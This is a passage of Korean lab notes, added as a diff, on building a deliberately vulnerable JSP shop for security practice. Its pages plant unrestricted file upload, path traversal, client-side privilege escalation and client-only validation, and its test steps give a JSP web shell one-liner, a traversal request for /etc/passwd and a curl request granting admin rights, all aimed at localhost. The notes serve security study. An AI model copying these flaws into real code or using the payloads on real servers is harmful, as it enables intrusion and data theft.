+    String DB_PASSWORD = &quot;shop1234&quot;;
+
+    Connection conn  = null;
+    PreparedStatement pstmt = null;
+
+    try {
+        Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+        conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+
+        // 서버 측 비밀번호 길이 검증 없음 (JS 우회 시 그대로 저장됨)
+        // priority는 기본값 9 (일반 사용자) 고정
+        String sql = &quot;INSERT INTO users (uname, passwd, profile, priority) VALUES (?, ?, ?, 9)&quot;;
+        pstmt = conn.prepareStatement(sql);
+        pstmt.setString(1, uname);
+        pstmt.setString(2, passwd);
+        pstmt.setString(3, profile);
+        pstmt.executeUpdate();
+
+        response.sendRedirect(&quot;login.html&quot;);
+
+    } catch (Exception e) {
+        out.println(&quot;오류: &quot; + e.getMessage());
+    } finally {
+        if (pstmt != null) try { pstmt.close(); } catch (Exception e) {}
+        if (conn  != null) try { conn.close();  } catch (Exception e) {}
+    }
+%&gt;
+</code></pre>
+<ul>
+<li><strong>JS 우회 테스트 방법</strong> — 브라우저 개발자 도구에서 JS를 비활성화하거나 아래처럼 직접 요청을 보내면 8자 제한이 무력화<pre><code class="language-bash">curl -X POST http://localhost:8080/register.jsp \
+  -d &quot;uname=hacker&amp;passwd=123456789012345&amp;profile=test&quot;
+</code></pre>
+<ul>
+<li>서버에서 길이 검증이 없기 때문에 그대로 DB에 저장된다</li>
+<li>결과
+<img src="/assets/imgs/notes/server-build-practice/63-image-61.png" alt="image.png" loading="lazy"></li>
+</ul>
+</li>
+</ul>
+<h4>상품 페이지</h4>
+<h5>product.html</h5>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;상품 페이지 - Shop&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/product.css&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class=&quot;product-container&quot;&gt;
+    &lt;h2&gt;상품 목록&lt;/h2&gt;
+    &lt;table&gt;
+      &lt;thead&gt;
+        &lt;tr&gt;
+          &lt;th&gt;상품명&lt;/th&gt;
+          &lt;th&gt;가격&lt;/th&gt;
+          &lt;th&gt;설명&lt;/th&gt;
+          &lt;th&gt;이미지&lt;/th&gt;
+        &lt;/tr&gt;
+      &lt;/thead&gt;
+      &lt;tbody id=&quot;product-list&quot;&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+
+    &lt;hr /&gt;
+
+    &lt;h3&gt;상품 이미지 업로드 (관리자용)&lt;/h3&gt;
+    &lt;form action=&quot;product_upload.jsp&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;상품명&lt;/label&gt;
+        &lt;input type=&quot;text&quot; name=&quot;name&quot; required /&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;가격&lt;/label&gt;
+        &lt;input type=&quot;number&quot; name=&quot;price&quot; required /&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;상품 설명&lt;/label&gt;
+        &lt;input type=&quot;text&quot; name=&quot;description&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;상품 이미지&lt;/label&gt;
+        &lt;input type=&quot;file&quot; name=&quot;imageFile&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;button type=&quot;submit&quot;&gt;상품 등록&lt;/button&gt;
+    &lt;/form&gt;
+
+    &lt;hr /&gt;
+
+    &lt;h3&gt;상품 이미지 다운로드&lt;/h3&gt;
+    &lt;form action=&quot;product_download.jsp&quot; method=&quot;get&quot;&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;파일명 입력&lt;/label&gt;
+        &lt;input type=&quot;text&quot; name=&quot;filename&quot; placeholder=&quot;예: laptop.jpg&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;button type=&quot;submit&quot;&gt;다운로드&lt;/button&gt;
+    &lt;/form&gt;
+
+    &lt;div class=&quot;nav-links&quot;&gt;
+      &lt;a href=&quot;mypage.html&quot;&gt;내 정보 수정&lt;/a&gt;&amp;nbsp;|&amp;nbsp;
+      &lt;a href=&quot;login.html&quot;&gt;로그아웃&lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;script&gt;
+    fetch(&quot;product_list.jsp&quot;)
+      .then(res =&gt; res.text())
+      .then(html =&gt; {
+        document.getElementById(&quot;product-list&quot;).innerHTML = html;
+      });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h5>product_list.jsp</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;%
+    String DB_URL      = &quot;jdbc:mariadb://172.16.10.100:3306/shopdb&quot;;
+    String DB_USER     = &quot;shopuser&quot;;
+    String DB_PASSWORD = &quot;shop1234&quot;;
+
+    Connection conn  = null;
+    Statement  stmt  = null;
+    ResultSet  rs    = null;
+
+    try {
+        Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+        conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+        stmt = conn.createStatement();
+
+        String sql = &quot;SELECT * FROM products&quot;;
+        rs = stmt.executeQuery(sql);
+
+        while (rs.next()) {
+%&gt;
+        &lt;tr&gt;
+          &lt;td&gt;&lt;%= rs.getString(&quot;name&quot;) %&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;%= rs.getInt(&quot;price&quot;) %&gt;원&lt;/td&gt;
+          &lt;td&gt;&lt;%= rs.getString(&quot;description&quot;) %&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;%= rs.getString(&quot;image_name&quot;) %&gt;&lt;/td&gt;
+        &lt;/tr&gt;
+&lt;%
+        }
+    } catch (Exception e) {
+        out.println(&quot;&lt;tr&gt;&lt;td colspan='4'&gt;오류: &quot; + e.getMessage() + &quot;&lt;/td&gt;&lt;/tr&gt;&quot;);
+    } finally {
+        if (rs   != null) try { rs.close();   } catch (Exception e) {}
+        if (stmt != null) try { stmt.close();  } catch (Exception e) {}
+        if (conn != null) try { conn.close();  } catch (Exception e) {}
+    }
+%&gt;
+</code></pre>
+<h5>product_upload.jsp</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; %&gt;
+&lt;%@ page import=&quot;java.io.*, java.util.*&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.commons.fileupload.*&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.commons.fileupload.disk.*&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.commons.fileupload.servlet.*&quot; %&gt;
+&lt;%@ page import=&quot;java.sql.*&quot; %&gt;
+&lt;%
+    String DB_URL      = &quot;jdbc:mariadb://172.16.10.100:3306/shopdb&quot;;
+    String DB_USER     = &quot;shopuser&quot;;
+    String DB_PASSWORD = &quot;shop1234&quot;;
+
+    // ⚠️ 취약점: 업로드 경로가 웹 루트 내부 → 업로드한 JSP 파일 직접 실행 가능
+    String uploadPath = application.getRealPath(&quot;/uploads&quot;);
+    File uploadDir = new File(uploadPath);
+    if (!uploadDir.exists()) uploadDir.mkdirs();
+
+    String name        = &quot;&quot;;
+    String price       = &quot;&quot;;
+    String description = &quot;&quot;;
+    String imageName   = &quot;&quot;;
+
+    try {
+        DiskFileItemFactory factory = new DiskFileItemFactory();
+        ServletFileUpload upload = new ServletFileUpload(factory);
+        List&lt;FileItem&gt; items = upload.parseRequest(request);
+
+        for (FileItem item : items) {
+            if (item.isFormField()) {
+                String fieldName = item.getFieldName();
+                String value     = item.getString(&quot;UTF-8&quot;);
+                if (fieldName.equals(&quot;name&quot;))        name        = value;
+                if (fieldName.equals(&quot;price&quot;))       price       = value;
+                if (fieldName.equals(&quot;description&quot;)) description = value;
+            } else {
+                // ⚠️ 취약점: 확장자·MIME 타입 검증 없이 원본 파일명 그대로 저장
+                imageName = item.getName();
+                File savedFile = new File(uploadPath + File.separator + imageName);
+                item.write(savedFile);
+            }
+        }
+
+        // DB에 상품 정보 저장
+        Connection        conn  = null;
+        PreparedStatement pstmt = null;
+        Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+        conn  = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+        String sql = &quot;INSERT INTO products (name, price, description, image_name) VALUES (?, ?, ?, ?)&quot;;
+        pstmt = conn.prepareStatement(sql);
+        pstmt.setString(1, name);
+        pstmt.setInt(2, Integer.parseInt(price));
+        pstmt.setString(3, description);
+        pstmt.setString(4, imageName);
+        pstmt.executeUpdate();
+
+        if (pstmt != null) pstmt.close();
+        if (conn  != null) conn.close();
+
+        response.sendRedirect(&quot;product.html&quot;);
+
+    } catch (Exception e) {
+        out.println(&quot;오류: &quot; + e.getMessage());
+    }
+%&gt;
+</code></pre>
+<h5>product_download.jsp</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;application/octet-stream&quot; pageEncoding=&quot;UTF-8&quot; %&gt;
+&lt;%@ page import=&quot;java.io.*&quot; %&gt;
+&lt;%
+    // ⚠️ 취약점: 파일명을 검증 없이 경로에 결합 → Path Traversal 가능
+    //            예: filename=../../etc/passwd 입력 시 서버 파일 탈취 가능
+    String filename   = request.getParameter(&quot;filename&quot;);
+    String uploadPath = application.getRealPath(&quot;/uploads&quot;);
+
+    File file = new File(uploadPath + File.separator + filename);
+
+    response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\&quot;&quot; + filename + &quot;\&quot;&quot;);
+
+    try {
+        FileInputStream fis = new FileInputStream(file);
+        byte[] buffer = new byte[4096];
+        int bytesRead;
+        while ((bytesRead = fis.read(buffer)) != -1) {
+            response.getOutputStream().write(buffer, 0, bytesRead);
+        }
+        fis.close();
+    } catch (Exception e) {
+        out.println(&quot;오류: &quot; + e.getMessage());
+    }
+%&gt;
+</code></pre>
+<h4>취약점</h4>
+<ul>
+<li><strong>파일 업로드 취약점 테스트</strong> — <code>.jsp</code> 파일을 업로드하면 웹셸로 실행</li>
+</ul>
+<pre><code class="language-bash"># 웹셸 파일 생성
+echo '&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;' &gt; shell.jsp
+
+# 업로드
+curl -X POST http://localhost:8080/product_upload.jsp \
+  -F &quot;name=test&quot; -F &quot;price=0&quot; -F &quot;description=test&quot; \
+  -F &quot;imageFile=@shell.jsp&quot;
+</code></pre>
+<ul>
+<li><strong>Path Traversal 테스트</strong> — 파일명에 <code>../</code>를 넣어 서버 내부 파일을 탈취
+<ul>
+<li><code>http://localhost:8080/product_download.jsp?filename=../../etc/passwd</code></li>
+</ul>
+</li>
+</ul>
+<h4>필요 패키지 설치 - commons-fileupload 라이브러리</h4>
+<pre><code class="language-bash"># Tomcat lib 디렉토리에 다운로드
+cd /var/lib/tomcat10/webapps/ROOT/WEB-INF/lib/
+
+wget https://repo1.maven.org/maven2/commons-fileupload/commons-fileupload/1.4/commons-fileupload-1.4.jar
+wget https://repo1.maven.org/maven2/commons-io/commons-io/2.11.0/commons-io-2.11.0.jar
+
+# Tomcat 재시작
+systemctl restart tomcat10
+</code></pre>
+<h4>마이페이지</h4>
+<h5>mypage.html</h5>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;회원 정보 수정 - Shop&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class=&quot;container&quot;&gt;
+    &lt;h2&gt;회원 정보 수정&lt;/h2&gt;
+    &lt;form action=&quot;mypage.jsp&quot; method=&quot;post&quot;&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;새 비밀번호&lt;/label&gt;
+        &lt;input type=&quot;password&quot; name=&quot;passwd&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;프로필 소개&lt;/label&gt;
+        &lt;input type=&quot;text&quot; name=&quot;profile&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;!-- ⚠️ 취약점: priority를 hidden 필드로 전송 → 클라이언트에서 값 조작 가능 --&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;priority&quot; value=&quot;9&quot; /&gt;
+
+      &lt;button type=&quot;submit&quot;&gt;수정하기&lt;/button&gt;
+    &lt;/form&gt;
+
+    &lt;div class=&quot;link-row&quot;&gt;
+      &lt;a href=&quot;product.html&quot;&gt;상품 페이지로&lt;/a&gt;&amp;nbsp;|&amp;nbsp;
+      &lt;a href=&quot;delete.jsp&quot;&gt;회원 탈퇴&lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h5>mypage.jsp</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;%
+    // 로그인 세션 확인
+    String uname = (String) session.getAttribute(&quot;uname&quot;);
+    if (uname == null) {
+        response.sendRedirect(&quot;login.html&quot;);
+        return;
+    }
+
+    String passwd  = request.getParameter(&quot;passwd&quot;);
+    String profile = request.getParameter(&quot;profile&quot;);
+
+    // ⚠️ 취약점: priority를 클라이언트 요청값 그대로 사용 (서버 검증 없음)
+    //            hidden 필드 값을 0으로 조작하면 관리자 권한 획득 가능
+    String priority = request.getParameter(&quot;priority&quot;);
+
+    String DB_URL      = &quot;jdbc:mariadb://172.16.10.100:3306/shopdb&quot;;
+    String DB_USER     = &quot;shopuser&quot;;
+    String DB_PASSWORD = &quot;shop1234&quot;;
+
+    Connection        conn  = null;
+    PreparedStatement pstmt = null;
+
+    try {
+        Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+        conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+
+        String sql = &quot;UPDATE users SET passwd=?, profile=?, priority=? WHERE uname=?&quot;;
+        pstmt = conn.prepareStatement(sql);
+        pstmt.setString(1, passwd);
+        pstmt.setString(2, profile);
+        pstmt.setInt(3, Integer.parseInt(priority));
+        pstmt.setString(4, uname);
+        pstmt.executeUpdate();
+
+        response.sendRedirect(&quot;product.html&quot;);
+
+    } catch (Exception e) {
+        out.println(&quot;오류: &quot; + e.getMessage());
+    } finally {
+        if (pstmt != null) try { pstmt.close(); } catch (Exception e) {}
+        if (conn  != null) try { conn.close();  } catch (Exception e) {}
+    }
+%&gt;
+</code></pre>
+<ul>
+<li><strong>권한 상승 테스트 방법</strong> — 브라우저 개발자 도구에서 hidden 필드 값을 수정하거나 curl로 직접 요청<pre><code class="language-bash">curl -X POST http://localhost:8080/mypage.jsp \
+  -d &quot;passwd=newpass&amp;profile=해커&amp;priority=0&quot; \
+  -b &quot;JSESSIONID=세션ID값&quot;
+</code></pre>
+<ul>
+<li>priority를 <code>0</code>으로 바꾸면 일반 사용자가 관리자 권한을 획득하게 된다.</li>
+</ul>
+</li>
+</ul>
+<h5>delete.jsp</h5>
+<pre><code class="language-java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; import=&quot;java.sql.*&quot; %&gt;
+&lt;%
+    // 로그인 세션 확인
+    String uname = (String) session.getAttribute(&quot;uname&quot;);
+    if (uname == null) {
+        response.sendRedirect(&quot;login.html&quot;);
+        return;
+    }
+
+    String DB_URL      = &quot;jdbc:mariadb://172.16.10.100:3306/shopdb&quot;;
+    String DB_USER     = &quot;shopuser&quot;;
+    String DB_PASSWORD = &quot;shop1234&quot;;
+
+    Connection        conn  = null;
+    PreparedStatement pstmt = null;
+
+    try {
+        Class.forName(&quot;org.mariadb.jdbc.Driver&quot;);
+        conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+
+        String sql = &quot;DELETE FROM users WHERE uname=?&quot;;
+        pstmt = conn.prepareStatement(sql);
+        pstmt.setString(1, uname);
+        pstmt.executeUpdate();
+
+        // 세션 삭제 후 로그인 페이지로 이동
+        session.invalidate();
+        response.sendRedirect(&quot;login.html&quot;);
+
+    } catch (Exception e) {
+        out.println(&quot;오류: &quot; + e.getMessage());
+    } finally {
+        if (pstmt != null) try { pstmt.close(); } catch (Exception e) {}
+        if (conn  != null) try { conn.close();  } catch (Exception e) {}
+    }
+%&gt;
+</code></pre>
+<ul>
+<li>탈퇴 흐름<pre><code>mypage.html 의 [회원 탈퇴] 링크 클릭
+       ↓
+  delete.jsp 실행
+       ↓
+  세션에서 uname 꺼내서 DELETE 쿼리 실행
+       ↓
+  session.invalidate() 로 세션 삭제
+       ↓
+  login.html 로 리다이렉트
+</code></pre>
+</li>
+</ul>
+<h4>CSS</h4>
+<h5>common.css</h5>
+<pre><code class="language-css">* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background-color: #f5f5f5;
+  color: #333;
+  font-size: 15px;
+  line-height: 1.6;
+}
+
+a {
+  color: #555;
+  text-decoration: none;
+}
+
+a:hover {
+  color: #111;
+  text-decoration: underline;
+}
+
+button {
+  cursor: pointer;
+  border: none;
+  border-radius: 6px;
+  padding: 10px 20px;
+  font-size: 14px;
+  background-color: #222;
+  color: #fff;
+  transition: background-color 0.2s;
+}
+
+button:hover {
+  background-color: #444;
+}
+
+input[type=&quot;text&quot;],
+input[type=&quot;password&quot;],
+input[type=&quot;number&quot;],
+input[type=&quot;file&quot;] {
+  width: 100%;
+  padding: 10px 12px;
+  border: 1px solid #ddd;
+  border-radius: 6px;
+  font-size: 14px;
+  background-color: #fff;
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+input:focus {
+  border-color: #999;
+}
+
+label {
+  font-size: 13px;
+  color: #666;
+  font-weight: 500;
+}
+
+hr {
+  border: none;
+  border-top: 1px solid #eee;
+  margin: 24px 0;
+}
+
+.container {
+  max-width: 500px;
+  margin: 60px auto;
+  background: #fff;
+  padding: 40px;
+  border-radius: 10px;
+  border: 1px solid #eee;
+}
+
+.container h2 {
+  font-size: 20px;
+  font-weight: 600;
+  margin-bottom: 28px;
+  color: #111;
+}
+
+.form-group {
+  margin-bottom: 18px;
+}
+
+.form-group label {
+  display: block;
+  margin-bottom: 6px;
+}
+
+.link-row {
+  margin-top: 16px;
+  font-size: 13px;
+  color: #888;
+  text-align: center;
+}
+</code></pre>
+<h5>product.css</h5>
+<pre><code class="language-css">.product-container {
+  max-width: 900px;
+  margin: 40px auto;
+  background: #fff;
+  padding: 40px;
+  border-radius: 10px;
+  border: 1px solid #eee;
+}
+
+.product-container h2 {
+  font-size: 20px;
+  font-weight: 600;
+  margin-bottom: 24px;
+  color: #111;
+}
+
+.product-container h3 {
+  font-size: 16px;
+  font-weight: 600;
+  margin-bottom: 16px;
+  color: #333;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 14px;
+}
+
+thead {
+  background-color: #f9f9f9;
+}
+
+th {
+  padding: 12px 14px;
+  text-align: left;
+  font-weight: 500;
+  color: #555;
+  border-bottom: 1px solid #eee;
+}
+
+td {
+  padding: 12px 14px;
+  border-bottom: 1px solid #f0f0f0;
+  color: #333;
+}
+
+tr:hover td {
+  background-color: #fafafa;
+}
+
+.nav-links {
+  margin-top: 24px;
+  font-size: 13px;
+  color: #aaa;
+}
+</code></pre>
+<h3>업그레이드 버전</h3>
+<ul>
+<li>파일 구조<pre><code>shop-v3/
+├── css/
+│   ├── common.css          ← 인증 페이지 공통 스타일
+│   └── product.css         ← 상품·마이페이지 스타일
+│
+├── login.html              ← 프론트엔드
+├── login.jsp               ← 백엔드 (SQL Injection 취약)
+├── register.html           ← 프론트엔드 (JS 길이 검증)
+├── register.jsp            ← 백엔드 (서버 검증 없음, priority=9 고정)
+├── mypage.html             ← 프론트엔드
+├── mypage.jsp              ← 백엔드 (priority 조작 취약)
+├── product.html            ← 프론트엔드 (관리자/일반 분기)
+├── check_session.jsp       ← 세션 정보 JSON 반환 (product.html 에서 사용)
+├── product_list.jsp        ← 상품 목록 렌더링
+├── product_upload.jsp      ← 파일 업로드 (확장자 검증 없음)
+├── product_download.jsp    ← 파일 다운로드 (Path Traversal 취약)
+└── delete.jsp              ← 회원 탈퇴
+</code></pre>
+</li>
+</ul>
+<h5>login</h5>
+<ul>
+<li>login.html<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;로그인 · SHOPD&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+  &lt;script&gt;
+    // URL 파라미터로 에러 메시지 처리 (login.jsp 에서 ?error=1 로 리다이렉트)
+    window.addEventListener('DOMContentLoaded', () =&gt; {
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('error') === '1') {
+        document.getElementById('error-msg').style.display = 'flex';
+      }
+    });
+  &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;auth-page&quot;&gt;
+
+  &lt;!-- 왼쪽 브랜드 패널 --&gt;
+  &lt;aside class=&quot;auth-side&quot;&gt;
+    &lt;div class=&quot;auth-side__brand&quot;&gt;
+      &lt;div class=&quot;brand-icon&quot;&gt;🛍&lt;/div&gt;
+      SHOPD
+    &lt;/div&gt;
+    &lt;div class=&quot;auth-side__content&quot;&gt;
+      &lt;h2&gt;
+        프리미엄 쇼핑의&lt;br&gt;
+        &lt;strong&gt;새로운 기준&lt;/strong&gt;
+      &lt;/h2&gt;
+      &lt;p&gt;엄선된 상품과 빠른 배송으로&lt;br&gt;최고의 쇼핑 경험을 제공합니다.&lt;/p&gt;
+      &lt;div class=&quot;auth-side__stats&quot;&gt;
+        &lt;div class=&quot;stat-item&quot;&gt;
+          &lt;div class=&quot;stat-item__num&quot;&gt;12K+&lt;/div&gt;
+          &lt;div class=&quot;stat-item__label&quot;&gt;등록 상품&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;stat-item&quot;&gt;
+          &lt;div class=&quot;stat-item__num&quot;&gt;98%&lt;/div&gt;
+          &lt;div class=&quot;stat-item__label&quot;&gt;고객 만족도&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;stat-item&quot;&gt;
+          &lt;div class=&quot;stat-item__num&quot;&gt;24h&lt;/div&gt;
+          &lt;div class=&quot;stat-item__label&quot;&gt;빠른 배송&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;stat-item&quot;&gt;
+          &lt;div class=&quot;stat-item__num&quot;&gt;5년&lt;/div&gt;
+          &lt;div class=&quot;stat-item__label&quot;&gt;운영 경력&lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;auth-side__footer&quot;&gt;© 2025 SHOPD Inc. All rights reserved.&lt;/div&gt;
+  &lt;/aside&gt;
+
+  &lt;!-- 오른쪽 로그인 폼 --&gt;
+  &lt;main class=&quot;auth-main&quot;&gt;
+    &lt;div class=&quot;auth-box&quot;&gt;
+      &lt;div class=&quot;auth-box__header&quot;&gt;
+        &lt;h1&gt;다시 오신 것을 환영합니다&lt;/h1&gt;
+        &lt;p&gt;계정에 로그인하여 쇼핑을 시작하세요&lt;/p&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 에러 메시지 (login.jsp 에서 ?error=1 리다이렉트 시 표시) --&gt;
+      &lt;div id=&quot;error-msg&quot; class=&quot;alert alert-error&quot; style=&quot;display:none;&quot;&gt;
+        &lt;svg width=&quot;16&quot; height=&quot;16&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+          &lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;
+          &lt;line x1=&quot;12&quot; y1=&quot;8&quot; x2=&quot;12&quot; y2=&quot;12&quot;/&gt;
+          &lt;line x1=&quot;12&quot; y1=&quot;16&quot; x2=&quot;12.01&quot; y2=&quot;16&quot;/&gt;
+        &lt;/svg&gt;
+        아이디 또는 비밀번호가 올바르지 않습니다.
+      &lt;/div&gt;
+
+      &lt;form action=&quot;login.jsp&quot; method=&quot;post&quot;&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+          &lt;label for=&quot;uname&quot;&gt;아이디&lt;/label&gt;
+          &lt;input type=&quot;text&quot; id=&quot;uname&quot; name=&quot;uname&quot;
+                 placeholder=&quot;아이디를 입력하세요&quot; autocomplete=&quot;username&quot; /&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+          &lt;label for=&quot;passwd&quot;&gt;비밀번호&lt;/label&gt;
+          &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;passwd&quot;
+                 placeholder=&quot;비밀번호를 입력하세요&quot; autocomplete=&quot;current-password&quot; /&gt;
+        &lt;/div&gt;
+        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot; style=&quot;margin-top:8px;&quot;&gt;
+          로그인
+          &lt;svg width=&quot;15&quot; height=&quot;15&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2.5&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+            &lt;path d=&quot;M5 12h14M12 5l7 7-7 7&quot;/&gt;
+          &lt;/svg&gt;
+        &lt;/button&gt;
+      &lt;/form&gt;
+
+      &lt;div class=&quot;divider&quot;&gt;또는&lt;/div&gt;
+
+      &lt;div class=&quot;link-row&quot;&gt;
+        계정이 없으신가요? &lt;a href=&quot;register.html&quot;&gt;회원가입&lt;/a&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/main&gt;
+
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt; 
+</code></pre>
+</li>
+<li>login.jsp</li>
+</ul>
+<h5>register</h5>
+<ul>
+<li>register.html<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;회원가입 · SHOPD&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+  &lt;script&gt;
+    /* ⚠️ 취약점: 비밀번호 길이 체크를 클라이언트(JS)에서만 수행
+       서버 측 검증이 없어 JS 우회 시 제한 무력화 가능 */
+    function validateForm() {
+      const passwd = document.getElementById(&quot;passwd&quot;).value;
+      if (passwd.length &gt; 8) {
+        document.getElementById(&quot;js-error&quot;).style.display = &quot;flex&quot;;
+        return false;
+      }
+      return true;
+    }
+
+    function updateStrength() {
+      const val  = document.getElementById(&quot;passwd&quot;).value;
+      const fill = document.getElementById(&quot;strength-fill&quot;);
+      const hint = document.getElementById(&quot;strength-hint&quot;);
+      const pct  = Math.min((val.length / 8) * 100, 100);
+      fill.style.width = pct + &quot;%&quot;;
+      if (!val.length) {
+        fill.style.background = &quot;transparent&quot;;
+        hint.textContent = &quot;&quot;;
+      } else if (val.length &lt;= 3) {
+        fill.style.background = &quot;#ef4444&quot;;
+        hint.textContent = &quot;너무 짧습니다&quot;;
+        hint.style.color = &quot;#ef4444&quot;;
+      } else if (val.length &lt;= 6) {
+        fill.style.background = &quot;#f59e0b&quot;;
+        hint.textContent = &quot;보통&quot;;
+        hint.style.color = &quot;#f59e0b&quot;;
+      } else {
+        fill.style.background = &quot;#22c55e&quot;;
+        hint.textContent = &quot;적절합니다&quot;;
+        hint.style.color = &quot;#22c55e&quot;;
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () =&gt; {
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('error') === '1') {
+        document.getElementById(&quot;server-error&quot;).style.display = &quot;flex&quot;;
+      }
+    });
+  &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;auth-page&quot;&gt;
+
+  &lt;!-- 왼쪽 브랜드 패널 --&gt;
+  &lt;aside class=&quot;auth-side&quot;&gt;
+    &lt;div class=&quot;auth-side__brand&quot;&gt;
+      &lt;div class=&quot;brand-icon&quot;&gt;🛍&lt;/div&gt;
+      SHOPD
+    &lt;/div&gt;
+    &lt;div class=&quot;auth-side__content&quot;&gt;
+      &lt;h2&gt;
+        지금 가입하고&lt;br&gt;
+        &lt;strong&gt;특별한 혜택&lt;/strong&gt;을&lt;br&gt;
+        누려보세요
+      &lt;/h2&gt;
